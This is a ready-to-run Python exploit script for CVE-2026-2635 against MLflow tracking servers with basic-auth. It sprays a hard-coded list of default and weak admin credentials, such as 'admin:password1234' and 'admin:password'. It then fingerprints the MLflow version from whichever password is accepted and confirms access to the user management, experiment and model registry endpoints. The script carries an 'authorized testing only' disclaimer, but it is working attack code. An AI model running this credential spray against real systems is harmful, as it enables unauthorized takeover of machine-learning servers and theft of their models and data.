#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MLflow Default Credentials — Credential Spray & Fingerprinting
# CVE            : CVE-2026-2635
# Vendor         : MLflow (Databricks)
# Product        : MLflow Tracking Server
# Affected       : v2.3.0 – v3.10.0+ (with --app-name basic-auth)
# Type           : CWE-1393 - Use of Default Credentials
# CVSS           : 9.8 (Critical)
# Platform       : Python / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2635 Vector 3: Credential Spray & Version Fingerprinting

Sprays all known historical default credentials across MLflow's version
history and fingerprints the MLflow version based on which password is
accepted (password1234 = v2.22.0+, password = v2.3.0-v2.21.x).

ATTACK CHAIN:
  1. Fingerprint target via /health endpoint
  2. Check signup page (info leak via different code path)
  3. Confirm authentication is enforced (HTTP 401)
  4. Spray known default credential pairs
  5. Fingerprint version from accepted password
  6. Cross-validate access via multiple API endpoints

PREREQUISITES:
  - MLflow server with --app-name basic-auth enabled
  - Network access to MLflow tracking server (default port 5000)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2635
  - https://www.zerodayinitiative.com/advisories/ZDI-26-111/
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import re

# ─── All Known Default Credentials (historical) ─────────────────────────────
# An attacker would spray these in order of likelihood.
CREDENTIAL_PAIRS = [
    # Current default (v2.22.0+)
    ("admin", "password1234", "v2.22.0+ (current default)"),
    # Legacy default (v2.3.0 – v2.21.x)
    ("admin", "password", "v2.3.0 – v2.21.x (legacy default)"),
    # Common weak admin passwords (if admin changed but chose poorly)
    ("admin", "admin", "Common weak password"),
    ("admin", "mlflow", "Product-name password"),
    ("admin", "admin123456789", "Weak variant"),
]

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def make_request(url, method="GET", data=None, headers=None, auth=None, timeout=10):
    """Send an HTTP request using urllib (stdlib only)."""
    if headers is None:
        headers = {}
    if auth:
        cred = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {cred}"
    if data is not None and isinstance(data, dict):
        data = json.dumps(data).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body), None
            except json.JSONDecodeError:
                return resp.status, {"raw": body}, None
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        try:
            return e.code, json.loads(body), None
        except json.JSONDecodeError:
            return e.code, {"raw": body}, None
    except urllib.error.URLError as e:
        return None, None, str(e.reason)
    except Exception as e:
        return None, None, str(e)


def exploit(target_host, target_port):
    """Spray known default credentials and fingerprint the MLflow version."""

    base_url = f"http://{target_host}:{target_port}"
    results = {"steps": [], "success": False, "found_creds": None}

    print(f"{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║  CVE-2026-2635 — Vector 3: Default Credential Spray        ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    print(f"Target: {base_url}\n")

    # ─── Step 1: Fingerprint — check health endpoint ─────────────────────
    print(f"{BOLD}[Step 1]{RESET} Fingerprinting target via /health endpoint ...")
    status, body, err = make_request(f"{base_url}/health")
    if err:
        print(f"  {RED}[FAIL]{RESET} Connection error: {err}")
        return results
    print(f"  {GREEN}[OK]{RESET}   Health endpoint responded: HTTP {status}")

    # ─── Step 2: Check signup page (info leak via different code path) ───
    print(f"\n{BOLD}[Step 2]{RESET} Checking signup page (publicly accessible, no auth needed) ...")
    status, body, err = make_request(f"{base_url}/signup")
    if status == 200:
        raw = body.get("raw", str(body))
        # The signup page HTML confirms basic-auth is in use
        if "Sign Up" in raw or "signup" in raw.lower() or "form" in raw.lower():
            print(f"  {GREEN}[OK]{RESET}   Signup page accessible — confirms basic-auth mode is active")
            print(f"         (Signup page is an unprotected route in the auth module)")
            results["steps"].append(("signup_check", "PASS", "Signup page confirms auth mode"))
        else:
            print(f"  {YELLOW}[INFO]{RESET} Got HTTP 200 but unexpected content")
            results["steps"].append(("signup_check", "INFO", "Unexpected content"))
    else:
        print(f"  {YELLOW}[INFO]{RESET} Signup page returned HTTP {status}")
        results["steps"].append(("signup_check", "INFO", f"HTTP {status}"))

    # ─── Step 3: Confirm auth is enforced ────────────────────────────────
    print(f"\n{BOLD}[Step 3]{RESET} Confirming authentication is enforced ...")
    status, body, err = make_request(f"{base_url}/api/2.0/mlflow/experiments/search")
    if status == 401:
        print(f"  {GREEN}[OK]{RESET}   HTTP 401 — authentication required")
        # Check WWW-Authenticate header for realm info
        results["steps"].append(("auth_enforced", "PASS", "HTTP 401"))
    else:
        print(f"  {YELLOW}[WARN]{RESET} Expected 401, got {status}")
        results["steps"].append(("auth_enforced", "WARN", f"HTTP {status}"))

    # ─── Step 4: Spray all known default credentials ─────────────────────
    print(f"\n{BOLD}[Step 4]{RESET} Spraying {len(CREDENTIAL_PAIRS)} known default credential pairs ...\n")

    valid_creds = []
    for username, password, desc in CREDENTIAL_PAIRS:
        auth = (username, password)
        status, body, err = make_request(
            f"{base_url}/api/2.0/mlflow/users/get?username={username}",
            auth=auth
        )

        if status == 200:
            is_admin = body.get("user", {}).get("is_admin", False)
            marker = f"{GREEN}✓ VALID{RESET}"
            if is_admin:
                marker += f" {GREEN}(ADMIN){RESET}"
            print(f"  {marker}  {username}:{password}  — {desc}")
            valid_creds.append((username, password, desc, is_admin))
        elif status == 401:
            print(f"  {RED}✗ DENIED{RESET} {username}:{password}  — {desc}")
        else:
            print(f"  {YELLOW}? HTTP {status}{RESET} {username}:{password}  — {desc}")

    if valid_creds:
        results["found_creds"] = valid_creds
        results["steps"].append(("cred_spray", "PASS",
                                 f"{len(valid_creds)}/{len(CREDENTIAL_PAIRS)} valid"))
    else:
        results["steps"].append(("cred_spray", "FAIL", "No valid credentials found"))
        results["success"] = False
        return results

    # ─── Step 5: Version fingerprinting via API response patterns ────────
    print(f"\n{BOLD}[Step 5]{RESET} Fingerprinting MLflow version ...")

    best_cred = valid_creds[0]  # Use first valid credential
    auth = (best_cred[0], best_cred[1])

    # Check MLflow version via the version endpoint or response headers
    status, body, err = make_request(f"{base_url}/api/2.0/mlflow/experiments/search",
                                     method="POST",
                                     data={"max_results": 1},
                                     auth=auth)
    if status == 200:
        print(f"  {GREEN}[OK]{RESET}   API responds to authenticated requests")

    # Try to determine version from password that worked
    for username, password, desc, is_admin in valid_creds:
        if password == "password1234":
            print(f"  {CYAN}[FINGERPRINT]{RESET} Password 'password1234' accepted → MLflow v2.22.0+")
            results["steps"].append(("fingerprint", "PASS", "v2.22.0+ (password1234)"))
        elif password == "password":
            print(f"  {CYAN}[FINGERPRINT]{RESET} Password 'password' accepted → MLflow v2.3.0–v2.21.x")
            results["steps"].append(("fingerprint", "PASS", "v2.3.0–v2.21.x (password)"))

    # ─── Step 6: Cross-validate via different API endpoint ───────────────
    print(f"\n{BOLD}[Step 6]{RESET} Cross-validating access via multiple API endpoints ...")

    endpoints = [
        ("GET", "/api/2.0/mlflow/users/get?username=admin", "User management"),
        ("POST", "/api/2.0/mlflow/experiments/search", "Experiment access"),
        ("GET", "/api/2.0/mlflow/registered-models/search?max_results=1", "Model registry"),
        ("GET", "/health", "Health (should work without auth too)"),
    ]

    all_ok = True
    for method, path, desc in endpoints:
        data = {"max_results": 1} if method == "POST" else None
        status, _, _ = make_request(f"{base_url}{path}", method=method, data=data, auth=auth)
        if status == 200:
            print(f"  {GREEN}[OK]{RESET}   {desc}: HTTP {status}")
        else:
            print(f"  {YELLOW}[--]{RESET}   {desc}: HTTP {status}")
            all_ok = False

    if all_ok:
        results["steps"].append(("cross_validate", "PASS", "All endpoints accessible"))
    else:
        results["steps"].append(("cross_validate", "WARN", "Some endpoints returned non-200"))

    # ─── Summary ─────────────────────────────────────────────────────────
    passed = sum(1 for _, s, _ in results["steps"] if s == "PASS")
    total = len(results["steps"])
    results["success"] = len(valid_creds) > 0

    print(f"\n{BOLD}{'═' * 62}{RESET}")
    if results["success"]:
        print(f"{BOLD}{GREEN}[VULNERABLE]{RESET} CVE-2026-2635 — Default credentials discovered")
        print(f"\n{BOLD}Valid Credential Pairs Found:{RESET}")
        for username, password, desc, is_admin in valid_creds:
            admin_tag = f" {GREEN}[ADMIN]{RESET}" if is_admin else ""
            print(f"  • {username}:{password} ({desc}){admin_tag}")
        print(f"""
{BOLD}Attack Technique:{RESET}
  This vector demonstrates that MLflow's default credentials are
  publicly documented in the source code and can be discovered by
  any attacker who knows the product. Unlike a brute-force attack,
  this is a DICTIONARY attack using KNOWN default credentials —
  it requires only 2 attempts (current + legacy password) to succeed
  against any unpatched MLflow installation with basic-auth enabled.
""")
    else:
        print(f"{BOLD}{RED}[NOT VULNERABLE]{RESET} No default credentials accepted")

    return results


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    result = exploit(target, port)
    sys.exit(0 if result["success"] else 1)
